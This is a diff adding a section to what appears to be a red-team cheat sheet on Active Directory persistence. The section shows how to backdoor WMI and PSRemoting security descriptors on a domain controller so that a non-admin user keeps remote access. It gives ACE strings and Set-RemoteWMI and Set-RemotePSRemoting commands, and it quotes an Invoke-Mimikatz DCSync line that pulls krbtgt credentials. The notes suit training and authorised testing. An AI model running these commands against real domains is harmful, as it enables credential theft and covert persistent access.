@@ -318,7 +318,67 @@ Invoke-Mimikatz -command '"lsadump::dcsync /user:dom\krbtgt"'\
 
 ## 🔑ACLs - Security Descriptors
 
+### **Description**
 
+* Modify Security Descriptors (Security information like Owner, primary group, DACL, SACL) of multiple remote access methods (securable objects) to allow access to non-admin users
+* Good for backdooring
+* You could allow non admin-users for Remote Management Protocols like WMI, PSRemoting etc. with this attack
+* Persistence is long
+* Security Descriptor Definition Language (SDDL) is used to describte a Seucurity Descriptor
+* SDDL uses ACE Strings for DACL and SACL:\
+  Ace format: ace\_type;ace\_flags;rights;object\_guid;inherit\_object\_guid;account\_sid\
+  ACE Documentation: [https://learn.microsoft.com/en-us/windows/win32/secauthz/ace-strings](https://learn.microsoft.com/en-us/windows/win32/secauthz/ace-strings?redirectedfrom=MSDN)
+* ACE for built-in administrors for WMI namespace example:\
+  A;CI;CCDCLCSWRPWPRCWD;;;SID\_of\_object\_you\_would\_like\_to\_give\_acess\
+  \=>rights are full control\
+  ❓SID for built-in administrator is BA
+* Goal: Add Backdoor privilege for your user to execute WMI queries on DC, without having admin privs\
+  WMI Auth: First, you need privileges to connect to the DCOM Endpoint; Second, you need privilege to connect to the Namespace
+
+### Requirements
+
+* Local Administrative rights on a system
+* On a DC you need DA rights
+
+
+
+### Tools
+
+**In GUI:**&#x20;
+
+1. On DC start application "Component Services"/Computers/My Computer/Properties/COM Security/Add your User
+2. WMI Namespace Permissions: On DC start Computer Management/Services and Applications/WMI Control/Properties/Security/Root Security/Advanced permissions / Applies to this namespace and subnamspaces!
+
+**List WMI Information from DC**\
+Get-WmiObject -class win32\_operatingsystem -computername dcname.dc.local\
+Execute commands via WMI now possible
+
+**Modify WMI ACL to allow non-admin users access to securable objects**\
+On Local machine for user1 on all WMI namespaces and DCOM\
+Set-RemoteWMI -Username user1 -verbose
+
+**On remote machine for user1 only for root\cimv2 namespace without explicit credentials**\
+Set-RemoteWMI -Username user1 -computername hostname -namespace 'root\cimv2' -verbose
+
+**On remote machine with explicit credentials. Only root\cimv2 and nested namespaces**\
+Set-RemoteWMI -Username user1 -computername hostname -credential administrator -namespace 'root\cimv2' -verbose
+
+**On remote machine remove permissions**\
+Set-RemoteWMI -Username user1 -computername hostname -namespace 'root\cimv2' -remove -verbose
+
+Invoke-Command -scriptblock{whoami} -computername dchost.dc.local => Does not work, because no DA privs, but only WMI Privs
+
+**PSRemoting: On local machine for user1**\
+Set-RemotePSRemoting -username user1 -verbose
+
+**PSRemoting: On remote machine for user1 without credentials**\
+Set-RemotePSRemoting -username user1 -computername targethost.dom.local -verbose\
+
+
+Invoke-Command -scriptblock{whoami} -computername dchost.dc.local => Works
+
+**PSRemoting: On remote machine remove user1** \
+Set-RemotePSRemoting -username user1 -computername argethost.dom.local -remove
 
 
 
